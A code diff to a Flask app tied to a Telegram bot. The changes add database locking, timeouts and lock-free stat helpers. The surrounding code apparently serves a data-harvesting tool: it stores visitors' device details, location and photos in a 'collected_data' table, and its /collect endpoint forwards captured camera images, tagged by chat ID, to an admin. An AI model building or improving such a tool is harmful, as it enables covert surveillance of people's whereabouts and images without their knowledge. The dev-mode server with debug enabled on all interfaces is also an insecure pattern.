@@ -6,6 +6,7 @@ import hashlib
 import base64
 import logging
 import requests
+import threading
 from io import BytesIO
 from flask import Flask, request, jsonify, render_template_string
 
@@ -23,51 +24,100 @@ logger = logging.getLogger(__name__)
 app = Flask(__name__)
 app.pending_broadcast = {}
 
-# ==================== DATABASE ====================
+# ==================== DATABASE WITH MUTEX LOCK ====================
 DB_PATH = "bot_data.db"
+DB_LOCK = threading.Lock()  # ← YEH LOCK SAB DB CALLS KO SERIAL KAREGA
 
 def get_db():
-    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=30)
+    conn = sqlite3.connect(DB_PATH, check_same_thread=False, timeout=60)
     conn.row_factory = sqlite3.Row
     conn.execute("PRAGMA journal_mode=WAL")
-    conn.execute("PRAGMA busy_timeout=5000")
+    conn.execute("PRAGMA busy_timeout=10000")
+    conn.execute("PRAGMA synchronous=NORMAL")
     return conn
 
 def init_db():
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("PRAGMA journal_mode=WAL")
-    c.execute("PRAGMA busy_timeout=5000")
-    c.executescript('''
-        CREATE TABLE IF NOT EXISTS users (
-            chat_id INTEGER PRIMARY KEY,
-            username TEXT,
-            first_name TEXT,
-            first_seen TEXT,
-            last_seen TEXT
-        );
-        CREATE TABLE IF NOT EXISTS collected_data (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            chat_id INTEGER,
-            timestamp TEXT,
-            device_info TEXT,
-            location TEXT,
-            photos TEXT,
-            additional TEXT
-        );
-        CREATE TABLE IF NOT EXISTS bot_stats (
-            key TEXT PRIMARY KEY,
-            value TEXT
-        );
-    ''')
-    defaults = {"total_users":"0","users_today":"0","total_data":"0","total_visits":"0","bot_status":"1","last_date":""}
-    for k, v in defaults.items():
-        c.execute("INSERT OR IGNORE INTO bot_stats (key, value) VALUES (?, ?)", (k, v))
-    conn.commit()
-    conn.close()
-    logger.info("✅ Database initialized")
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        c.executescript('''
+            CREATE TABLE IF NOT EXISTS users (
+                chat_id INTEGER PRIMARY KEY,
+                username TEXT,
+                first_name TEXT,
+                first_seen TEXT,
+                last_seen TEXT
+            );
+            CREATE TABLE IF NOT EXISTS collected_data (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                chat_id INTEGER,
+                timestamp TEXT,
+                device_info TEXT,
+                location TEXT,
+                photos TEXT,
+                additional TEXT
+            );
+            CREATE TABLE IF NOT EXISTS bot_stats (
+                key TEXT PRIMARY KEY,
+                value TEXT
+            );
+        ''')
+        defaults = {"total_users":"0","users_today":"0","total_data":"0","total_visits":"0","bot_status":"1","last_date":""}
+        for k, v in defaults.items():
+            c.execute("INSERT OR IGNORE INTO bot_stats (key, value) VALUES (?, ?)", (k, v))
+        conn.commit()
+        conn.close()
+        logger.info("✅ Database initialized")
 
 def get_stat(key):
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("SELECT value FROM bot_stats WHERE key=?", (key,))
+        row = c.fetchone()
+        conn.close()
+        return int(row["value"]) if row else 0
+
+def update_stat(key, value):
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("UPDATE bot_stats SET value=? WHERE key=?", (str(value), key))
+        conn.commit()
+        conn.close()
+
+def is_bot_on():
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("SELECT value FROM bot_stats WHERE key='bot_status'")
+        row = c.fetchone()
+        conn.close()
+        return int(row["value"]) == 1 if row else True
+
+def add_user(chat_id, username, first_name):
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        c.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
+        existing = c.fetchone()
+        if existing:
+            c.execute("UPDATE users SET username=?, first_name=?, last_seen=? WHERE chat_id=?", (username, first_name, now, chat_id))
+        else:
+            c.execute("INSERT INTO users (chat_id, username, first_name, first_seen, last_seen) VALUES (?,?,?,?,?)", (chat_id, username, first_name, now, now))
+            update_stat_no_lock("total_users", get_stat_no_lock("total_users") + 1)
+        today = datetime.datetime.now().strftime("%Y-%m-%d")
+        ld = get_stat_no_lock("last_date")
+        if ld != today:
+            update_stat_no_lock("last_date", today)
+            update_stat_no_lock("users_today", 0)
+        update_stat_no_lock("users_today", get_stat_no_lock("users_today") + 1)
+        conn.commit()
+        conn.close()
+
+# Lock-free versions for internal use (already inside add_user's lock)
+def get_stat_no_lock(key):
     conn = get_db()
     c = conn.cursor()
     c.execute("SELECT value FROM bot_stats WHERE key=?", (key,))
@@ -75,75 +125,57 @@ def get_stat(key):
     conn.close()
     return int(row["value"]) if row else 0
 
-def update_stat(key, value):
+def update_stat_no_lock(key, value):
     conn = get_db()
     c = conn.cursor()
     c.execute("UPDATE bot_stats SET value=? WHERE key=?", (str(value), key))
     conn.commit()
     conn.close()
 
-def is_bot_on():
-    return get_stat("bot_status") == 1
-
-def add_user(chat_id, username, first_name):
-    conn = get_db()
-    c = conn.cursor()
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    c.execute("SELECT * FROM users WHERE chat_id=?", (chat_id,))
-    existing = c.fetchone()
-    if existing:
-        c.execute("UPDATE users SET username=?, first_name=?, last_seen=? WHERE chat_id=?", (username, first_name, now, chat_id))
-    else:
-        c.execute("INSERT INTO users (chat_id, username, first_name, first_seen, last_seen) VALUES (?,?,?,?,?)", (chat_id, username, first_name, now, now))
-        update_stat("total_users", get_stat("total_users") + 1)
-    today = datetime.datetime.now().strftime("%Y-%m-%d")
-    if get_stat("last_date") != today:
-        update_stat("last_date", today)
-        update_stat("users_today", 0)
-    update_stat("users_today", get_stat("users_today") + 1)
-    conn.commit()
-    conn.close()
-
 def save_collected_data(chat_id, device_info, location, photos, additional):
-    conn = get_db()
-    c = conn.cursor()
-    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    c.execute('''INSERT INTO collected_data (chat_id, timestamp, device_info, location, photos, additional) VALUES (?,?,?,?,?,?)''',
-              (chat_id, now, json.dumps(device_info), json.dumps(location), json.dumps(photos), json.dumps(additional)))
-    conn.commit()
-    conn.close()
-    update_stat("total_data", get_stat("total_data") + 1)
-    update_stat("total_visits", get_stat("total_visits") + 1)
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        c.execute('''INSERT INTO collected_data (chat_id, timestamp, device_info, location, photos, additional) VALUES (?,?,?,?,?,?)''',
+                  (chat_id, now, json.dumps(device_info), json.dumps(location), json.dumps(photos), json.dumps(additional)))
+        conn.commit()
+        conn.close()
+        update_stat_no_lock("total_data", get_stat_no_lock("total_data") + 1)
+        update_stat_no_lock("total_visits", get_stat_no_lock("total_visits") + 1)
 
 def get_all_users():
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("SELECT * FROM users ORDER BY last_seen DESC")
-    rows = [dict(r) for r in c.fetchall()]
-    conn.close()
-    return rows
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("SELECT * FROM users ORDER BY last_seen DESC")
+        rows = [dict(r) for r in c.fetchall()]
+        conn.close()
+        return rows
 
 def get_recent_data(limit=10):
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("SELECT * FROM collected_data ORDER BY id DESC LIMIT ?", (limit,))
-    rows = [dict(r) for r in c.fetchall()]
-    conn.close()
-    return rows
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("SELECT * FROM collected_data ORDER BY id DESC LIMIT ?", (limit,))
+        rows = [dict(r) for r in c.fetchall()]
+        conn.close()
+        return rows
 
 def export_all_data():
-    conn = get_db()
-    c = conn.cursor()
-    c.execute("SELECT * FROM collected_data ORDER BY id DESC")
-    result = []
-    for r in c.fetchall():
-        d = dict(r)
-        for field in ["device_info","location","photos","additional"]:
-            if d.get(field):
-                d[field] = json.loads(d[field])
-        result.append(d)
-    conn.close()
-    return result
+    with DB_LOCK:
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("SELECT * FROM collected_data ORDER BY id DESC")
+        result = []
+        for r in c.fetchall():
+            d = dict(r)
+            for field in ["device_info","location","photos","additional"]:
+                if d.get(field):
+                    d[field] = json.loads(d[field])
+            result.append(d)
+        conn.close()
+        return result
 
 # ==================== TELEGRAM API HELPERS ====================
 
@@ -582,7 +614,6 @@ def collect():
                 if p.get("data","").startswith("data:image"):
                     send_photo_msg(aid, p["data"], f"📸 {p.get('camera','?')} — `{chat_id}`")
         
-        update_stat("total_visits", get_stat("total_visits") + 1)
         return jsonify({"status":"success"})
     except Exception as e:
         logger.error(f"Collect error: {e}", exc_info=True)
@@ -631,10 +662,10 @@ def delete_webhook():
     except Exception as e:
         return jsonify({"status":"error","message":str(e)})
 
-# ==================== STARTUP (GUNICORN COMPATIBLE) ====================
+# ==================== STARTUP ====================
 
 if __name__ == "__main__":
-    print("🚀 Running in development mode...")
+    print("🚀 Dev mode...")
     init_db()
     os.makedirs("photos", exist_ok=True)
     os.makedirs("captured_photos", exist_ok=True)
@@ -642,7 +673,6 @@ if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host="0.0.0.0", port=port, debug=True)
 else:
-    # Gunicorn mode
     print("🚀 Gunicorn mode: Initializing...")
     init_db()
     os.makedirs("photos", exist_ok=True)
@@ -657,6 +687,6 @@ else:
         except Exception as e:
             print(f"⚠️ Webhook auto-set failed: {e}")
     else:
-        print("⚠️ RENDER_EXTERNAL_URL not set. Visit /set_webhook after deploy.")
+        print("⚠️ Visit /set_webhook after deploy.")
     
     print(f"🤖 Bot ready! Admin: /admin | Health: /health")
